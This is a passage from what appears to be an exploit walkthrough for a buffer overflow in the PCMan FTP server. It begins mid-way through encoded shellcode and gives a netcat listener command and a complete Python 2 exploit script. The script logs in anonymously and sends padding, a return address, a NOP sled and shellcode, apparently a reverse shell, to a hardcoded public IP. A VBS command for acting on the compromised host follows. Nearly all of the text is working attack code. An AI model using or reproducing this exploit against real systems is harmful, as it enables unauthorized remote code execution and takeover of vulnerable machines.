buf += b"\x4e\x6b\x53\x31\x5a\x76\x65\x61\x59\x6f\x4e\x4c\x4f"
buf += b"\x31\x7a\x6f\x44\x4d\x67\x71\x49\x57\x65\x68\x4b\x50"
buf += b"\x70\x75\x49\x66\x63\x33\x71\x6d\x49\x68\x75\x6b\x53"
buf += b"\x4d\x76\x44\x33\x45\x58\x64\x33\x68\x4c\x4b\x71\x48"
buf += b"\x66\x44\x73\x31\x6b\x63\x65\x36\x4c\x4b\x74\x4c\x30"
buf += b"\x4b\x6e\x6b\x66\x38\x57\x6c\x47\x71\x48\x53\x6e\x6b"
buf += b"\x57\x74\x6c\x4b\x76\x61\x6a\x70\x6b\x39\x42\x64\x31"
buf += b"\x34\x77\x54\x43\x6b\x71\x4b\x70\x61\x56\x39\x30\x5a"
buf += b"\x32\x71\x69\x6f\x59\x70\x43\x6f\x61\x4f\x31\x4a\x6c"
buf += b"\x4b\x36\x72\x78\x6b\x6e\x6d\x61\x4d\x71\x78\x64\x73"
buf += b"\x35\x62\x75\x50\x73\x30\x42\x48\x53\x47\x30\x73\x44"
buf += b"\x72\x43\x6f\x63\x64\x73\x58\x50\x4c\x53\x47\x66\x46"
buf += b"\x35\x57\x6b\x4f\x68\x55\x4e\x58\x5a\x30\x35\x51\x75"
buf += b"\x50\x45\x50\x36\x49\x7a\x64\x53\x64\x72\x70\x52\x48"
buf += b"\x37\x59\x6f\x70\x42\x4b\x33\x30\x59\x6f\x49\x45\x72"
buf += b"\x70\x52\x70\x56\x30\x32\x70\x77\x30\x42\x70\x63\x70"
buf += b"\x76\x30\x32\x48\x68\x6a\x46\x6f\x39\x4f\x6b\x50\x79"
buf += b"\x6f\x38\x55\x6e\x77\x52\x4a\x34\x45\x52\x48\x56\x63"
buf += b"\x66\x6e\x4e\x56\x5a\x6b\x30\x68\x74\x42\x37\x70\x55"
buf += b"\x6e\x36\x75\x6d\x59\x4b\x56\x51\x7a\x72\x30\x42\x76"
buf += b"\x56\x37\x75\x38\x4d\x49\x4e\x45\x54\x34\x71\x71\x49"
buf += b"\x6f\x4b\x65\x6f\x75\x4f\x30\x53\x44\x36\x6c\x4b\x4f"
buf += b"\x32\x6e\x43\x38\x52\x55\x78\x6c\x43\x58\x4c\x30\x4e"
buf += b"\x55\x79\x32\x63\x66\x59\x6f\x58\x55\x31\x78\x50\x63"
buf += b"\x32\x4d\x42\x44\x57\x70\x4b\x39\x6a\x43\x72\x77\x51"
buf += b"\x47\x33\x67\x46\x51\x6c\x36\x33\x5a\x65\x42\x63\x69"
buf += b"\x71\x46\x6d\x32\x39\x6d\x71\x76\x79\x57\x52\x64\x66"
buf += b"\x44\x47\x4c\x77\x71\x77\x71\x6c\x4d\x53\x74\x65\x74"
buf += b"\x42\x30\x6a\x66\x65\x50\x32\x64\x70\x54\x56\x30\x50"
buf += b"\x56\x56\x36\x52\x76\x67\x36\x56\x36\x30\x4e\x36\x36"
buf += b"\x71\x46\x76\x33\x52\x76\x52\x48\x72\x59\x68\x4c\x37"
buf += b"\x4f\x4d\x56\x39\x6f\x6a\x75\x6e\x69\x4d\x30\x42\x6e"
buf += b"\x36\x36\x37\x36\x39\x6f\x36\x50\x70\x68\x64\x48\x6e"
buf += b"\x67\x35\x4d\x73\x50\x39\x6f\x4e\x35\x6d\x6b\x6a\x50"
buf += b"\x78\x35\x49\x32\x30\x56\x55\x38\x4f\x56\x4c\x55\x6f"
buf += b"\x4d\x4d\x4d\x49\x6f\x6a\x75\x35\x6c\x43\x36\x33\x4c"
buf += b"\x35\x5a\x4d\x50\x39\x6b\x4b\x50\x54\x35\x73\x35\x6d"
buf += b"\x6b\x31\x57\x76\x73\x42\x52\x62\x4f\x61\x7a\x47\x70"
buf += b"\x71\x43\x6b\x4f\x79\x45\x41\x41"

```
Open a netcat port in kali with the command:
```sh
nc -lvp 2021
```

Copy the shell in the python script and run it on the windows machine

```python
#!/usr/bin/env python

from socket import *
from time import sleep
from sys import exit, exc_info
import os

print ("-") *40
print ("|    PCman Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|               thanks to Master Dreg! |")
print ("-") *40

target_ip = "3.131.147.49" #target_ip = "127.0.0.1"  
port = int(18453) #port = int(21)

shellcode = '\x41' * 2011 # paddingshellcode = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9'
shellcode += "\x9f\x53\x10\x10"
shellcode += '\x90' * 20
buf = b"\x89\xe6\xdb\xd0\xd9\x76\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x6d\x38\x6e"
buf += b"\x62\x57\x70\x73\x30\x33\x30\x63\x50\x4c\x49\x78\x65"
buf += b"\x30\x31\x39\x50\x31\x74\x4c\x4b\x76\x30\x74\x70\x6c"
buf += b"\x4b\x62\x72\x56\x6c\x4c\x4b\x70\x52\x36\x74\x6c\x4b"
buf += b"\x64\x32\x35\x78\x64\x4f\x78\x37\x71\x5a\x57\x56\x46"
buf += b"\x51\x6b\x4f\x6c\x6c\x65\x6c\x33\x51\x31\x6c\x65\x52"
buf += b"\x66\x4c\x51\x30\x6f\x31\x78\x4f\x64\x4d\x35\x51\x6a"
buf += b"\x67\x6a\x42\x6a\x52\x33\x62\x63\x67\x4c\x4b\x73\x62"
buf += b"\x52\x30\x4c\x4b\x32\x6a\x37\x4c\x4e\x6b\x70\x4c\x52"
buf += b"\x31\x30\x78\x4b\x53\x72\x68\x77\x71\x4e\x31\x33\x61"
buf += b"\x6c\x4b\x43\x69\x67\x50\x73\x31\x4e\x33\x6c\x4b\x71"
buf += b"\x59\x44\x58\x4d\x33\x74\x7a\x62\x69\x6e\x6b\x66\x54"
buf += b"\x4e\x6b\x67\x71\x49\x46\x64\x71\x59\x6f\x6e\x4c\x6a"
buf += b"\x61\x4a\x6f\x74\x4d\x55\x51\x69\x57\x70\x38\x4b\x50"
buf += b"\x52\x55\x4a\x56\x37\x73\x73\x4d\x5a\x58\x75\x6b\x61"
buf += b"\x6d\x67\x54\x52\x55\x59\x74\x43\x68\x6c\x4b\x32\x78"
buf += b"\x47\x54\x57\x71\x4e\x33\x50\x66\x6c\x4b\x66\x6c\x50"
buf += b"\x4b\x6e\x6b\x71\x48\x67\x6c\x37\x71\x68\x53\x4c\x4b"
buf += b"\x63\x34\x6c\x4b\x75\x51\x6e\x30\x4c\x49\x42\x64\x54"
buf += b"\x64\x75\x74\x43\x6b\x63\x6b\x31\x71\x56\x39\x51\x4a"
buf += b"\x72\x71\x6b\x4f\x59\x70\x53\x6f\x61\x4f\x30\x5a\x6c"
buf += b"\x4b\x64\x52\x58\x6b\x4e\x6d\x71\x4d\x52\x48\x45\x63"
buf += b"\x66\x52\x77\x70\x45\x50\x43\x58\x31\x67\x73\x43\x46"
buf += b"\x52\x31\x4f\x62\x74\x42\x48\x30\x4c\x54\x37\x47\x56"
buf += b"\x45\x57\x39\x6f\x6e\x35\x48\x38\x6a\x30\x53\x31\x45"
buf += b"\x50\x47\x70\x56\x49\x4a\x64\x53\x64\x42\x70\x53\x58"
buf += b"\x67\x59\x4f\x70\x32\x4b\x53\x30\x39\x6f\x69\x45\x46"
buf += b"\x30\x62\x70\x62\x70\x76\x30\x63\x70\x30\x50\x33\x70"
buf += b"\x46\x30\x31\x78\x78\x6a\x54\x4f\x69\x4f\x59\x70\x39"
buf += b"\x6f\x69\x45\x4f\x67\x31\x7a\x67\x75\x30\x68\x33\x33"
buf += b"\x4c\x46\x71\x37\x69\x4c\x43\x58\x54\x42\x73\x30\x34"
buf += b"\x6f\x4f\x45\x6f\x79\x7a\x46\x30\x6a\x74\x50\x70\x56"
buf += b"\x32\x77\x72\x48\x4d\x49\x6d\x75\x52\x54\x33\x51\x79"
buf += b"\x6f\x4b\x65\x6f\x75\x59\x50\x30\x74\x44\x4c\x79\x6f"
buf += b"\x50\x4e\x53\x38\x42\x55\x58\x6c\x42\x48\x7a\x50\x6f"
buf += b"\x45\x6f\x52\x61\x46\x39\x6f\x4b\x65\x61\x78\x33\x53"
buf += b"\x52\x4d\x31\x74\x37\x70\x6f\x79\x7a\x43\x31\x47\x50"
buf += b"\x57\x76\x37\x55\x61\x6b\x46\x32\x4a\x55\x42\x30\x59"
buf += b"\x30\x56\x4b\x52\x39\x6d\x32\x46\x5a\x67\x30\x44\x54"
buf += b"\x64\x47\x4c\x35\x51\x77\x71\x4c\x4d\x47\x34\x75\x74"
buf += b"\x46\x70\x59\x56\x73\x30\x51\x54\x46\x34\x62\x70\x72"
buf += b"\x76\x51\x46\x71\x46\x31\x56\x63\x66\x62\x6e\x76\x36"
buf += b"\x46\x36\x46\x33\x76\x36\x50\x68\x64\x39\x6a\x6c\x67"
buf += b"\x4f\x6b\x36\x4b\x4f\x6a\x75\x4b\x39\x4b\x50\x50\x4e"
buf += b"\x62\x76\x37\x36\x79\x6f\x70\x30\x75\x38\x63\x38\x6b"
buf += b"\x37\x47\x6d\x73\x50\x6b\x4f\x68\x55\x6d\x6b\x7a\x50"
buf += b"\x6c\x75\x69\x32\x46\x36\x33\x58\x69\x36\x4c\x55\x6f"
buf += b"\x4d\x6d\x4d\x49\x6f\x48\x55\x45\x6c\x54\x46\x33\x4c"
buf += b"\x56\x6a\x4b\x30\x6b\x4b\x4b\x50\x52\x55\x43\x35\x6d"
buf += b"\x6b\x72\x67\x36\x73\x42\x52\x32\x4f\x31\x7a\x35\x50"
buf += b"\x50\x53\x79\x6f\x6e\x35\x41\x41"
shellcode += buf

print("\nshellcode content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))
print("\n")

target = inet_aton(target_ip)
target = inet_ntoa(target)

try:
    socket = socket(AF_INET, SOCK_STREAM)
except:
    print "\nError creating the network socket\n\n%s\n" % exc_info()       
    exit(1)    

try:
    print "Connecting to %s %d" % (target, port)
    socket.connect((target, port))
except:
    print "\nError connecting to %s\n\n%s\n" % (target, exc_info())
    exit(1)
    
print("Connected!")
sleep(1)
print(socket.recv(1000))
sleep(1)
print("Logging as anonymous")
socket.send('USER anonymous\r\n')
sleep(1)
print(socket.recv(1024))
print("Empty password")
sleep(1)
socket.send('PASS\r\n')
sleep(1)
print(socket.recv(1024))
try:
    print "Sending evil packet to %s %d (length: %d bytes), please wait a few secs...." % (target, port, len(shellcode))
    socket.send(shellcode)
    sleep(4)
    socket.close()

except:
    print "\nError sending evil packet to %s\n\n%s\n" % (target, exc_info())
    exit(1)


print("\n\nDone! :-)\n")


sleep(1)
```
Now it's time to play! Open a pop up window on the remote machine, and say hello!

```sh
echo msgbox "Hola que ase!" > %tmp%\tmp.vbs
cscript /nologo %tmp%\tmp.vbs
del %tmp%\tmp.vbs
```
```python
                    ___                            
                   /  /\                           
                  /  /::\                          
  ___     ___    /  /:/\:\    ___     ___          
 /__/\   /  /\  /  /:/  \:\  /__/\   /  /\         
 \  \:\ /  /:/ /__/:/ \__\:\ \  \:\ /  /:/         
  \  \:\  /:/  \  \:\ /  /:/  \  \:\  /:/          
   \  \:\/:/    \  \:\  /:/    \  \:\/:/           
    \  \::/      \  \:\/:/      \  \::/            
     \__\/        \  \::/        \__\/             
                   \__\/                           

```
